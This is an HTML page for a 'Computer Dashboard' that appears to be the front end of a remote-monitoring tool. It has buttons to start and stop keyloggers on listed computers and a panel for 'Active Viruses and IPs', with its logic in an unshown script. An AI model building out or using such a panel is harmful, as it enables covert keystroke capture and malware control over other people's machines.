<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Computer Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header>
        <h1>Computer Dashboard</h1>
        <p>Explore available computers, view contents, and control keyloggers securely.</p>
    </header>
    
    <main>
        <section id="computer-list-section">
            <h2>Available Computers</h2>
            <ul id="computer-list"></ul>
        </section>
        
        <section id="computer-content">
            <h2>Computer Content</h2>
            <div id="control-panel">
                <button id="start-keylogger" class="control-btn start">Start Keylogger</button>
                <button id="stop-keylogger" class="control-btn stop">Stop Keylogger</button>
                <p id="control-status" class="status-message"></p>
            </div>
            <pre id="content-area">Select a computer to view its content.</pre>
            <div id="additional-info" style="display: none;">
                <h3>Active Viruses and IPs</h3>
                <ul id="virus-list"></ul>
            </div>
        </section>
    </main>
    
    <footer>
        <p>&copy; 2025 Computer Monitoring System. All rights reserved.</p>
    </footer>
    
    <script src="scripts.js"></script>
</body>
</html>
